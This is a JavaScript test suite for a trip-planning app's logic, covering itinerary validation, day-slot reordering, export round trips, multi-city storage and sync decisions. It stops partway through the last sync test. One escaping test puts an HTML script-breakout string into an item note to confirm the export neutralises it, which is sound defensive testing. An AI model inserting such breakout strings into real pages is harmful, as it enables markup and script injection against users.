const assert = require('node:assert');
const { loadCityOps } = require('./harness');
let pass = 0, fail = 0;
function test(name, fn) {
  try { fn(); pass++; console.log('PASS ' + name); }
  catch (e) { fail++; console.log('FAIL ' + name + '\n  ' + e.message); }
}
const C = loadCityOps();

const GOOD = {
  schema: 1,
  city: { name: 'Batumi', country: 'GE',
    dates: { from: '2026-08-08', to: '2026-08-15' },
    accommodation: { name: 'Example Stay D2', lat: 41.64, lng: 41.61 },
    currency: { code: 'GEL', usd: 0.37 },
    notes: ['Bolt works well'] },
  sections: [
    { id: 'dinner', label: 'Dinner', icon: '🍽️' },
    { id: 'coffee', label: 'Coffee', icon: '☕' }
  ],
  items: [
    { id: 'brasserie', section: 'dinner', status: 'plan', day: '2026-08-13',
      when: 'Old Town office day', name: 'Brasserie 1900',
      price: { text: '~80-120 GEL / $30-44' }, note: '4.8 stars, reserve.',
      hours: { text: '12:00-23:00 daily', class: 'late' }, tags: ['Book ahead'],
      links: [{ kind: 'map', label: 'Open in Maps', href: 'https://maps.google.com/?cid=895365817124148954' }],
      place_id: null, verified: null },
    { id: 'tanini', section: 'dinner', status: 'plan', day: '2026-08-10',
      name: 'Tanini', links: [], place_id: null, verified: null },
    { id: 'sisters', section: 'dinner', status: 'backup',
      name: 'At the Sisters', links: [], place_id: null, verified: null },
    { id: 'nord', section: 'coffee', status: 'plan',
      name: 'Nord Specialty Coffee', links: [], place_id: null, verified: null }
  ]
};
function clone(o) { return JSON.parse(JSON.stringify(o)); }

// Task 1: core pure logic
test('slug lowercases and hyphenates', () => {
  assert.equal(C.slug('Example Stay D2'), 'example-stay-d2');
});
test('cityId is name slug + start date', () => {
  assert.equal(C.cityId(GOOD), 'batumi-2026-08-08');
});
test('dayLabel derives weekday from ISO date', () => {
  assert.equal(C.dayLabel('2026-08-13'), 'Thu 13');
  assert.equal(C.dayLabel('2026-08-09'), 'Sun 9');
});
test('parse accepts valid data', () => {
  const r = C.parse(JSON.stringify(GOOD));
  assert.deepEqual(r.errors, []);
  assert.equal(r.data.city.name, 'Batumi');
});
test('parse reports JSON syntax errors', () => {
  const r = C.parse('{ nope');
  assert.equal(r.data, null);
  assert.ok(/JSON parse error/.test(r.errors[0]));
});
test('validate catches schema violations', () => {
  const bad = clone(GOOD);
  bad.schema = 2;
  bad.items[0].status = 'someday';
  bad.items[1].section = 'ghost';
  bad.items[2].id = 'brasserie';
  bad.items[3].day = 'Thursday';
  const errs = C.validate(bad);
  assert.ok(errs.some(e => /schema must be 1/.test(e)));
  assert.ok(errs.some(e => /bad status/.test(e)));
  assert.ok(errs.some(e => /unknown section/.test(e)));
  assert.ok(errs.some(e => /duplicate item id/.test(e)));
  assert.ok(errs.some(e => /YYYY-MM-DD/.test(e)));
});

// Task 2: state model
function fakeStorage() {
  var m = {};
  return {
    getItem: function (k) { return k in m ? m[k] : null; },
    setItem: function (k, v) { m[k] = String(v); },
    removeItem: function (k) { delete m[k]; }
  };
}
test('store round-trips state through storage', () => {
  const store = C.makeStore('batumi-2026-08-08', fakeStorage());
  assert.equal(store.persistent, true);
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  store.save(st);
  const back = store.load();
  assert.equal(back.itemStatus.brasserie, 'done');
  assert.ok(back.updated);
});
test('store without storage falls back to memory', () => {
  const store = C.makeStore('x', null);
  assert.equal(store.persistent, false);
  const st = C.emptyState();
  st.itemStatus.a = 'done';
  store.save(st);
  assert.equal(store.load().itemStatus.a, 'done');
});
test('setStatus rejects invalid status', () => {
  assert.throws(() => C.setStatus(C.emptyState(), 'x', 'someday'));
});
test('effectiveStatus: live state wins over authored status', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveStatus(GOOD.items[0], st), 'plan');
  C.setStatus(st, 'brasserie', 'done');
  assert.equal(C.effectiveStatus(GOOD.items[0], st), 'done');
});
const STAY = ['2026-08-08', '2026-08-09', '2026-08-10', '2026-08-11',
  '2026-08-12', '2026-08-13', '2026-08-14', '2026-08-15'];
function slotOf(vm, iso) { return vm[0].days.find(d => d.iso === iso); }
test('viewModel: every stay date gets a slot, content sits on its own date', () => {
  const vm = C.viewModel(GOOD, C.emptyState());
  assert.equal(vm.length, 2);
  const dinner = vm[0];
  assert.deepEqual(dinner.days.map(d => d.iso), STAY);
  assert.deepEqual(dinner.days.map(d => d.key), STAY); // default: key === own slot
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'tanini');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-08').items.length, 0); // empty day exists
  assert.ok(dinner.days.every(d => !d.outside));
  assert.deepEqual(dinner.backups.map(i => i.id), ['sisters']);
  assert.equal(vm[1].days.length, 0); // coffee has no dayed items: no day cards
  assert.deepEqual(vm[1].undated.map(i => i.id), ['nord']);
});
test('pre-empty-slot saved orders keep content on its dates (migration)', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-10', '2026-08-13']; // an old identity arrangement, no empty keys
  const vm = C.viewModel(GOOD, st);
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'tanini');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-08').items.length, 0);
});
test('stay dates override drives slots, out-of-range days flagged', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-12', '2026-08-14');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso),
    ['2026-08-10', '2026-08-12', '2026-08-13', '2026-08-14']);
  assert.equal(slotOf(vm, '2026-08-10').outside, true);
  assert.equal(slotOf(vm, '2026-08-13').outside, false);
  assert.throws(() => C.setStayDates(C.emptyState(), '2026-08-14', '2026-08-12'));
  assert.throws(() => C.setStayDates(C.emptyState(), 'nope', '2026-08-12'));
});
test('effectiveDates: valid override wins, malformed falls back', () => {
  const st = C.emptyState();
  assert.deepEqual(C.effectiveDates(GOOD, st), GOOD.city.dates);
  st.stayOverride = { from: '2026-08-07', to: '2026-08-16' };
  assert.equal(C.effectiveDates(GOOD, st).from, '2026-08-07');
  st.stayOverride = { from: 'garbage', to: '2026-08-16' };
  assert.deepEqual(C.effectiveDates(GOOD, st), GOOD.city.dates);
});
test('buildExport bakes overridden stay dates', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-07', '2026-08-16');
  const out = C.buildExport(GOOD, st);
  assert.deepEqual(out.city.dates, { from: '2026-08-07', to: '2026-08-16' });
  assert.deepEqual(GOOD.city.dates, { from: '2026-08-08', to: '2026-08-15' }); // source untouched
});
test('reordering re-slots dates: content moves, dates stay chronological', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10', '2026-01-01']; // brasserie group first; bogus ignored
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-10').key, '2026-08-13');
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'tanini');
});
test('effectiveDay: itemDay override wins, null clears, setDay validates', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveDay(GOOD.items[0], st), '2026-08-13');
  C.setDay(st, 'brasserie', '2026-08-11');
  assert.equal(C.effectiveDay(GOOD.items[0], st), '2026-08-11');
  C.setDay(st, 'brasserie', null);
  assert.equal(C.effectiveDay(GOOD.items[0], st), null);
  assert.throws(() => C.setDay(st, 'brasserie', 'Thursday'));
});
test('promoted backup with a day joins the day slots', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-10');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(slotOf(vm, '2026-08-10').items.map(i => i.id), ['tanini', 'sisters']);
  assert.equal(vm[0].backups.length, 0);
});
test('itemDay override merging two groups into one slot is safe', () => {
  const st = C.emptyState();
  C.setDay(st, 'brasserie', '2026-08-10'); // joins tanini's group
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.deepEqual(slotOf(vm, '2026-08-10').items.map(i => i.id), ['brasserie', 'tanini']);
  assert.equal(slotOf(vm, '2026-08-13').items.length, 0);
});
test('duplicate keys in stored dayOrder are deduped, no phantom slots', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-13', '2026-08-10'];
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-10').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'tanini');
  assert.ok(vm[0].days.every(d => d.label && d.label.indexOf('NaN') === -1));
});
test('stayDates spans the stay inclusive', () => {
  assert.deepEqual(C.stayDates(GOOD.city.dates).slice(0, 2), ['2026-08-08', '2026-08-09']);
  assert.equal(C.stayDates(GOOD.city.dates).length, 8);
});
test('normalizeState fills missing keys from older stored state', () => {
  const st = C.normalizeState({ itemStatus: { a: 'done' }, dayOrder: {} });
  assert.deepEqual(st.itemDay, {});
  assert.equal(st.dataOverride, null);
  assert.equal(st.stayOverride, null);
  assert.deepEqual(st.collapsedSections, {});
  assert.equal(st.itemStatus.a, 'done');
});
test('toggleSection flips collapse state per section', () => {
  const st = C.emptyState();
  C.toggleSection(st, 'dinner');
  assert.equal(st.collapsedSections.dinner, true);
  C.toggleSection(st, 'coffee');
  C.toggleSection(st, 'dinner');
  assert.ok(!('dinner' in st.collapsedSections));
  assert.equal(st.collapsedSections.coffee, true);
});
test('viewModel keeps done items in place, moves archived out', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'tanini', 'archived');
  const vm = C.viewModel(GOOD, st);
  assert.deepEqual(vm[0].days.map(d => d.iso), STAY);
  assert.equal(slotOf(vm, '2026-08-13').items[0].id, 'brasserie');
  assert.equal(slotOf(vm, '2026-08-10').items.length, 0); // archived group leaves an empty day
  assert.deepEqual(vm[0].archived.map(i => i.id), ['tanini']);
});
test('stale state ids for removed items are ignored', () => {
  const st = C.emptyState();
  C.setStatus(st, 'ghost-item', 'done');
  const vm = C.viewModel(GOOD, st);
  assert.equal(vm.length, 2); // no throw, ghost id has no effect
});
test('effectiveData returns valid override, else base', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveData(GOOD, st), GOOD);
  st.dataOverride = { schema: 2 };
  assert.equal(C.effectiveData(GOOD, st), GOOD); // invalid override dropped
  const good2 = clone(GOOD);
  good2.city.name = 'Batumi 2';
  st.dataOverride = good2;
  assert.equal(C.effectiveData(GOOD, st).city.name, 'Batumi 2');
});

// Task 4: rendering helpers
test('fmtRange formats a stay', () => {
  assert.equal(C.fmtRange({ from: '2026-08-08', to: '2026-08-15' }), 'Aug 8-15, 2026');
  assert.equal(C.fmtRange({ from: '2026-08-28', to: '2026-09-04' }), 'Aug 28 - Sep 4, 2026');
});

// Task 6: export
test('buildExport bakes live statuses into items', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'sisters', 'plan');
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'brasserie').status, 'done');
  assert.equal(out.items.find(i => i.id === 'sisters').status, 'plan');
  assert.equal(out.schema, 1);
  assert.equal(GOOD.items.find(i => i.id === 'brasserie').status, 'plan'); // source untouched
});
test('buildExport bakes re-slotted dates into day fields', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10']; // brasserie group moved into the first (Aug 10) slot
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'brasserie').day, '2026-08-10');
  assert.equal(out.items.find(i => i.id === 'tanini').day, '2026-08-13');
  const dinnerDayed = out.items.filter(i => i.section === 'dinner' && i.day);
  assert.deepEqual(dinnerDayed.map(i => i.id), ['brasserie', 'tanini']); // slot order
  assert.equal(GOOD.items.find(i => i.id === 'brasserie').day, '2026-08-13'); // source untouched
});
test('buildExport bakes itemDay overrides, including cleared days', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-10');
  C.setDay(st, 'brasserie', null);
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'sisters').day, '2026-08-10');
  assert.ok(!('day' in out.items.find(i => i.id === 'brasserie')));
});
test('export round trip is lossless', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  C.setStatus(st, 'nord', 'archived');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-11');
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10', '2026-08-11'];
  const exported = C.buildExport(GOOD, st);
  const reimported = C.parse(JSON.stringify(exported)).data;
  const again = C.buildExport(reimported, C.emptyState());
  assert.deepEqual(again, exported);
});

// Task 7: diff summary
test('diffSummary counts added and removed item ids', () => {
  const next = clone(GOOD);
  next.items = next.items.filter(i => i.id !== 'nord');
  next.items.push({ id: 'new-cafe', section: 'coffee', status: 'plan',
    name: 'New Cafe', links: [], place_id: null, verified: null });
  assert.equal(C.diffSummary(GOOD, next), '1 added, 1 removed, 3 unchanged');
});

// Task 8: share view
test('shareModel includes plan+done only, days chronological', () => {
  const st = C.emptyState();
  C.setStatus(st, 'brasserie', 'done');
  const sm = C.shareModel(GOOD, st);
  assert.deepEqual(sm.days.map(d => d.iso), ['2026-08-10', '2026-08-13']);
  assert.equal(sm.days[1].entries[0].status, 'done');
  assert.deepEqual(sm.undated.map(e => e.it.id), ['nord']);
  const all = sm.days.flatMap(d => d.entries).concat(sm.undated);
  assert.ok(!all.some(e => e.it.id === 'sisters')); // backup excluded
});

// Task 9: batumi dataset sanity
test('batumi.json is valid and complete', () => {
  const fs = require('fs');
  const res = C.parse(fs.readFileSync(require('path').join(__dirname, '..', 'cities', 'batumi.json'), 'utf8'));
  assert.deepEqual(res.errors, []);
  assert.equal(C.cityId(res.data), 'batumi-2026-08-08');
  assert.equal(res.data.sections.length, 6);
  const ids = res.data.items.map(i => i.id);
  ['heart-of-batumi', 'tanini', 'blue-wave', 'riverside-makhuntseti', 'brasserie-1900',
   'adjarian-khachapuri', 'nord', 'kopi', 'urban-roastery', 'locus', 'lendspace',
   'botanical-garden', 'makhuntseti', 'argo-cable-car', 'boulevard', 'ali-nino',
   'gonio-fortress', 'harmony-laundry'].forEach(id =>
    assert.ok(ids.includes(id), 'missing ' + id));
  const dinnerDays = res.data.items.filter(i => i.section === 'dinner' && i.day && i.status === 'plan');
  assert.ok(dinnerDays.length >= 7, 'expected a dinner plan for each day');
  assert.ok(res.data.items.some(i => i.status === 'done'), 'ali-nino should be done');
  assert.ok(res.data.items.some(i => i.status === 'archived'), 'skip entries should be archived');
});

// Iteration 5: titles, view mode, displayed-date mapping, calendar model
test('effectiveName override, trim, and revert', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini');
  C.setTitle(st, 'tanini', '  Tanini or Sakhli  ');
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini or Sakhli');
  C.setTitle(st, 'tanini', '');
  assert.equal(C.effectiveName(GOOD.items[1], st), 'Tanini');
  C.setTitle(st, 'tanini', null);
  assert.ok(!('tanini' in st.itemTitle));
});
test('setViewMode validates', () => {
  const st = C.emptyState();
  C.setViewMode(st, 'day');
  assert.equal(st.viewMode, 'day');
  assert.throws(() => C.setViewMode(st, 'week'));
});
test('normalizeState defaults viewMode and itemTitle', () => {
  const st = C.normalizeState({ itemStatus: {}, viewMode: 'bogus' });
  assert.equal(st.viewMode, 'type');
  assert.deepEqual(st.itemTitle, {});
});
test('keyForDisplayedDate maps the date the user sees to its group', () => {
  const st = C.emptyState();
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10'), '2026-08-10');
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10']; // brasserie group displayed on Aug 10
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10'), '2026-08-13');
  assert.equal(C.keyForDisplayedDate(GOOD, st, 'coffee', '2026-08-10'), '2026-08-10'); // no day cards: raw date
});
test('joining a displayed date joins its visible group', () => {
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10'];
  const key = C.keyForDisplayedDate(GOOD, st, 'dinner', '2026-08-10');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', key);
  const vm = C.viewModel(GOOD, st);
  const mon = vm[0].days.find(d => d.iso === '2026-08-10');
  assert.deepEqual(mon.items.map(i => i.id), ['brasserie', 'sisters']);
});
test('calendarModel merges sections by displayed date with empty fill', () => {
  const st = C.emptyState();
  C.setStatus(st, 'nord', 'plan');
  C.setDay(st, 'nord', '2026-08-10'); // coffee item joins Monday
  const cm = C.calendarModel(GOOD, st);
  assert.equal(cm.days.length, 8); // full stay, empty days included
  const mon = cm.days.find(d => d.iso === '2026-08-10');
  assert.deepEqual(mon.entries.map(e => e.it.id), ['tanini', 'nord']); // section order within the day
  assert.equal(mon.entries[1].sec.id, 'coffee');
  const sat = cm.days.find(d => d.iso === '2026-08-08');
  assert.equal(sat.entries.length, 0);
  assert.equal(cm.undated.length, 0);
  assert.equal(cm.sections.length, 2);
});
test('buildExport bakes custom titles, round trip stays lossless', () => {
  const st = C.emptyState();
  C.setTitle(st, 'tanini', 'Tanini or Sakhli');
  C.setStatus(st, 'sisters', 'plan');
  C.setDay(st, 'sisters', '2026-08-11');
  const out = C.buildExport(GOOD, st);
  assert.equal(out.items.find(i => i.id === 'tanini').name, 'Tanini or Sakhli');
  assert.equal(GOOD.items.find(i => i.id === 'tanini').name, 'Tanini'); // source untouched
  const again = C.buildExport(C.parse(JSON.stringify(out)).data, C.emptyState());
  assert.deepEqual(again, out);
});

test('promote resolves the displayed slot before the item turns active', () => {
  // A backup item carrying a stale day must not contaminate its own slot lookup.
  const data = clone(GOOD);
  data.items.find(i => i.id === 'sisters').day = '2026-08-11'; // stale day on a backup
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-11', '2026-08-10']; // stale arrangement
  C.setStatus(st, 'brasserie', 'backup');
  C.setStatus(st, 'tanini', 'backup'); // section now has zero active dayed items
  const key = C.keyForDisplayedDate(data, st, 'dinner', '2026-08-10');
  assert.equal(key, '2026-08-10'); // with nothing active, displayed Mon IS Mon
});

// Task 3: multi-city app store (pure helpers; the app shell owns localStorage)
const CITY_B = clone(GOOD);
const CITY_Y = clone(GOOD);
CITY_Y.city.name = 'Yerevan';
CITY_Y.city.dates = { from: '2026-08-15', to: '2026-08-22' };
test('appStore.normalize fills missing keys and repairs order/active', () => {
  const empty = C.appStore.normalize(null);
  assert.deepEqual(empty, { cities: {}, order: [], active: null, updatedAt: {}, profile: C.profile.normalize(null) });
  const s = C.appStore.normalize({
    cities: {
      a: CITY_B, b: CITY_Y,
      c: { city: { name: 'Broken' } },   // missing dates
      d: null,                            // not an object
      e: { notCity: 1 },                  // missing city entirely
      f: { city: { dates: { from: '2026-01-01', to: '2026-01-02' } } } // missing name
    },
    order: ['b', 'b', 'ghost', 'c', 'd', 'f'],
    active: 'ghost'
  });
  assert.deepEqual(s.order, ['b', 'a']); // dedupe, drop unknown, drop malformed, append orphans
  assert.equal(s.active, 'b');           // unknown active falls back to the first city
  assert.deepEqual(Object.keys(s.cities).sort(), ['a', 'b']); // malformed entries dropped entirely
});
test('appStore.add derives the id, appends order, flags replacement', () => {
  let s = C.appStore.normalize(null);
  const first = C.appStore.add(s, CITY_B);
  assert.equal(first.cityId, 'batumi-2026-08-08');
  assert.equal(first.replaced, false);
  const second = C.appStore.add(first.store, CITY_Y);
  assert.deepEqual(second.store.order, ['batumi-2026-08-08', 'yerevan-2026-08-15']);
  const again = C.appStore.add(second.store, CITY_B);
  assert.equal(again.replaced, true);
  assert.deepEqual(again.store.order, ['batumi-2026-08-08', 'yerevan-2026-08-15']); // no duplicate slot
});
test('appStore.keepBothName renames so cityId derives a fresh id', () => {
  const copy = clone(CITY_B);
  copy.city.name = C.appStore.keepBothName(copy.city.name);
  assert.equal(copy.city.name, 'Batumi 2');
  assert.equal(C.cityId(copy), 'batumi-2026-08-08'.replace('batumi', 'batumi-2'));
  copy.city.name = C.appStore.keepBothName(copy.city.name); // collides again: suffix again
  assert.equal(C.cityId(copy), 'batumi-2-2-2026-08-08');
});
test('appStore.remove drops the city and repoints active', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'batumi-2026-08-08';
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.deepEqual(s.order, ['yerevan-2026-08-15']);
  assert.ok(!('batumi-2026-08-08' in s.cities));
  assert.equal(s.active, 'yerevan-2026-08-15'); // first remaining
  const empty = C.appStore.remove(s, 'yerevan-2026-08-15');
  assert.deepEqual(empty.order, []);
  assert.equal(empty.active, null);
});
test('appStore.remove of an inactive city leaves active alone', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'yerevan-2026-08-15';
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.equal(s.active, 'yerevan-2026-08-15');
});

// T3 review fix wave
test('appStore.resolveStartCity: hash known > active > first > null', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y).store;
  s.active = 'batumi-2026-08-08';
  assert.equal(C.appStore.resolveStartCity(s, 'yerevan-2026-08-15'), 'yerevan-2026-08-15'); // hash wins
  assert.equal(C.appStore.resolveStartCity(s, 'ghost-hash'), 'batumi-2026-08-08');          // unknown hash: active
  assert.equal(C.appStore.resolveStartCity(s, null), 'batumi-2026-08-08');                  // no hash: active
  const s2 = { cities: s.cities, order: s.order, active: 'ghost-active' };
  assert.equal(C.appStore.resolveStartCity(s2, null), s.order[0]);                          // unknown active: first
  const empty = C.appStore.normalize(null);
  assert.equal(C.appStore.resolveStartCity(empty, null), null);                             // nothing: null
});
test('keep-both collision loop finds a free id past a multi-deep collision chain', () => {
  // Mirrors the app shell's do/while loop in openAddModal: repeatedly apply
  // keepBothName and re-derive the id until it stops colliding, guarded at 20.
  let s = C.appStore.normalize(null);
  let name = 'Batumi';
  for (let i = 0; i < 3; i++) {
    name = C.appStore.keepBothName(name);
    const d = clone(CITY_B);
    d.city.name = name;
    s = C.appStore.add(s, d).store;
  }
  const copy = clone(CITY_B);
  let guard = 0;
  do {
    copy.city.name = C.appStore.keepBothName(copy.city.name);
    guard++;
  } while (Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)) && guard < 20);
  assert.equal(guard, 4); // 3 pre-seeded collisions plus the first fresh one
  assert.ok(!Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)));
});
test('keep-both collision loop fails closed when 20 renames are not enough', () => {
  let s = C.appStore.normalize(null);
  let name = 'Batumi';
  for (let i = 0; i < 20; i++) {
    name = C.appStore.keepBothName(name);
    const d = clone(CITY_B);
    d.city.name = name;
    s = C.appStore.add(s, d).store;
  }
  const copy = clone(CITY_B);
  let guard = 0;
  do {
    copy.city.name = C.appStore.keepBothName(copy.city.name);
    guard++;
  } while (Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)) && guard < 20);
  assert.equal(guard, 20);
  // Still colliding after the guard trips: the caller (app shell) must treat
  // this as a failure and refuse to commit, not silently overwrite the city.
  assert.ok(Object.prototype.hasOwnProperty.call(s.cities, C.cityId(copy)));
});
test('export escaping: </script in a note round-trips losslessly and never appears raw in the data block', () => {
  const st = C.emptyState();
  const data = clone(GOOD);
  data.items[0].note = '</script><img src=x>';
  const out = C.buildExport(data, st);
  // Same transform as exportStandalone() in src/app-shell.html.
  const escaped = JSON.stringify(out, null, 2).replace(/<\//g, '<\\/');
  // "\/" is a valid JSON escape for "/", so escaping is lossless.
  assert.deepEqual(JSON.parse(escaped), out);
  const block = '<script type="application/json" id="city-data">\n' + escaped + '\n</script>';
  const inner = block.slice(block.indexOf('\n') + 1, block.lastIndexOf('\n'));
  assert.equal(inner.indexOf('</script'), -1); // no raw close-tag sequence survives inside the block
});

test('template.html contains src/cityops.js verbatim (assembler sync)', () => {
  const fs = require('fs');
  const path = require('path');
  const engine = fs.readFileSync(path.join(__dirname, '..', 'src', 'cityops.js'), 'utf8');
  const tpl = fs.readFileSync(path.join(__dirname, '..', 'template.html'), 'utf8');
  assert.ok(tpl.includes(engine), 'run node tools/assemble.js after editing src/');
});
test('template.html and index.html contain src/cityops.css verbatim (assembler sync)', () => {
  const fs = require('fs');
  const path = require('path');
  const css = fs.readFileSync(path.join(__dirname, '..', 'src', 'cityops.css'), 'utf8').replace(/\n$/, '');
  ['template.html', 'index.html'].forEach(name => {
    const html = fs.readFileSync(path.join(__dirname, '..', name), 'utf8');
    assert.ok(html.includes(css), name + ': run node tools/assemble.js after editing src/');
  });
});
test('index.html embeds the standalone template, escaped and reversible', () => {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const idx = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
  const m = idx.match(/<script type="text\/plain" id="guide-template">\n([\s\S]*?)\n<\/script>/);
  assert.ok(m, 'guide-template block missing or closed early');
  // A raw </script or <!-- inside the block would end (or trap) it in the browser.
  assert.equal(m[1].indexOf('</script'), -1);
  assert.equal(m[1].indexOf('<!--'), -1);
  // Exactly the unescape the app performs on export.
  const un = m[1].replace(/<\\\/script/g, '</script');
  const tpl = fs.readFileSync(path.join(root, 'template.html'), 'utf8');
  const marked = tpl.replace(
    /(<script type="application\/json" id="city-data">)[\s\S]*?(<\/script>)/,
    (x, open, close) => open + '\n__CITY_DATA__\n' + close
  );
  assert.equal(un, marked);
  // And filling the marker reproduces what tools/embed.js writes, byte for byte.
  const city = fs.readFileSync(path.join(root, 'cities', 'batumi.json'), 'utf8').trim();
  assert.equal(un.replace('__CITY_DATA__', () => city),
    fs.readFileSync(path.join(root, 'batumi.html'), 'utf8'));
});

test('blankCity scaffolds a valid schema-v1 city', () => {
  const b = C.appStore.blankCity('  Tirana ', 'al', '2026-08-22', '2026-08-29');
  assert.deepEqual(C.validate(b), []);
  assert.equal(b.city.name, 'Tirana');
  assert.equal(b.city.country, 'AL');
  assert.equal(C.appStore.blankCity('X', 'usa', '2026-01-01', '2026-01-02').city.country, 'USA');
  assert.equal(b.sections.length, 8);
  assert.equal(b.items[0].section, 'practical');
  assert.equal(C.cityId(b), 'tirana-2026-08-22');
  assert.throws(() => C.appStore.blankCity('', 'AL', '2026-08-22', '2026-08-29'));
  assert.throws(() => C.appStore.blankCity('Tirana', 'AL', '2026-08-29', '2026-08-22'));
  assert.throws(() => C.appStore.blankCity('Tirana', 'AL', 'soon', '2026-08-29'));
});

// M2: sync helpers (pure). Network and UI live in src/app-shell.html and are
// verified in the browser, not here.
test('appStore stamps updatedAt on add, honours an injected iso, drops it on remove', () => {
  const before = new Date().toISOString();
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  const stamp = s.updatedAt['batumi-2026-08-08'];
  assert.ok(stamp >= before, 'add stamps now by default');
  assert.ok(!isNaN(Date.parse(stamp)));
  // A pulled city carries the REMOTE stamp so it does not push straight back.
  s = C.appStore.add(s, CITY_Y, '2026-08-01T00:00:00.000Z').store;
  assert.equal(s.updatedAt['yerevan-2026-08-15'], '2026-08-01T00:00:00.000Z');
  s = C.appStore.remove(s, 'batumi-2026-08-08');
  assert.ok(!('batumi-2026-08-08' in s.updatedAt));
  assert.deepEqual(Object.keys(s.updatedAt), ['yerevan-2026-08-15']);
});
test('appStore.normalize backfills missing stamps with EPOCH and prunes orphans', () => {
  let s = C.appStore.add(C.appStore.normalize(null), CITY_B).store;
  s = C.appStore.add(s, CITY_Y, '2026-08-01T00:00:00.000Z').store;
  delete s.updatedAt['batumi-2026-08-08'];          // pre-M2 store: no stamp at all
  s.updatedAt['ghost-city'] = '2026-08-02T00:00:00.000Z'; // stamp for a city that is gone
  s.updatedAt['yerevan-2026-08-15'] = 42;          // wrong type
  const n = C.appStore.normalize(s);
  assert.equal(n.updatedAt['batumi-2026-08-08'], C.syncKit.EPOCH);
  assert.equal(n.updatedAt['yerevan-2026-08-15'], C.syncKit.EPOCH);
  assert.ok(!('ghost-city' in n.updatedAt));
  assert.deepEqual(Object.keys(n.updatedAt).sort(), n.order.slice().sort());
});
test('seeding a city stamps EPOCH, not now, so a real server row always wins', () => {
  // Mirrors both app-shell.html seed call sites (first-run seed and
  // re-seed-after-remove): CityOps.appStore.add(store, clone(SEED_CITY), CityOps.syncKit.EPOCH).
  const s = C.appStore.add(C.appStore.normalize(null), CITY_B, C.syncKit.EPOCH).store;
  assert.equal(s.updatedAt['batumi-2026-08-08'], C.syncKit.EPOCH);
});
test('syncKit.decide covers the full newer-wins matrix', () => {
  const A = '2026-08-11T09:00:00.000Z';   // older
  const B = '2026-08-11T10:00:00.000Z';   // newer
  assert.equal(C.syncKit.decide(null, null), 'noop');   // 1 nothing anywhere
  assert.equal(C.syncKit.decide(A, null), 'push');      // 2 local only
  assert.equal(C.syncKit.decide(null, A), 'pull');      // 3 remote only
  assert.equal(C.syncKit.decide(B, A), 'push');         // 4 local newer
  assert.equal(C.syncKit.decide(A, B), 'pull');         // 5 remote newer
  assert.equal(C.syncKit.decide(A, A), 'noop');         // 6 exact tie keeps local
  assert.equal(C.syncKit.decide('not a date', A), 'pull');  // 7 junk local = no local stamp
  assert.equal(C.syncKit.decide(A, 'not a date'), 'push');  // 8 junk remote = no remote row
  // 9 same instant, two dialects: PostgREST offset form vs device Z form.
